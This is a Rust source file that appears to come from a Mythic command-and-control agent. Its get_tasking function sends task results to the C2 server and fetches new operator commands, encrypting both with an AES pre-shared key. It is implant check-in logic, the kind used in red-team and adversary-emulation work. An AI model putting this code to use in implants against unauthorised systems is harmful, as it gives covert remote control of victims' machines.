use crate::{
    C2Trait, MythicAgent, MythicC2, MythicError, MythicResult,
    agent::{aes256_packed, aes256_unpack, response::Response},
};

use super::types::get_tasking::{ReqGetTasking, RespGetTasking};

impl MythicAgent {
    pub fn get_tasking(
        &self,
        c2: &MythicC2,
        tasking_size: i32,
        resps: Vec<Response>,
    ) -> MythicResult<RespGetTasking> {
        let mut req = ReqGetTasking::new(tasking_size);
        req.responses = resps;
        let req_msg = serde_json::to_string(&req).map_err(|_| MythicError::Serialize)?;
        let req_packed = aes256_packed(&self.callback_uuid, &c2.get_aes_psk()?, req_msg)?;
        let resp_ppacked = c2.get_tasking(&req_packed)?;
        let resp_msg = aes256_unpack(&self.callback_uuid, &c2.get_aes_psk()?, resp_ppacked)?;
        serde_json::from_slice(&resp_msg).map_err(|_| MythicError::Deserialize)
    }
}
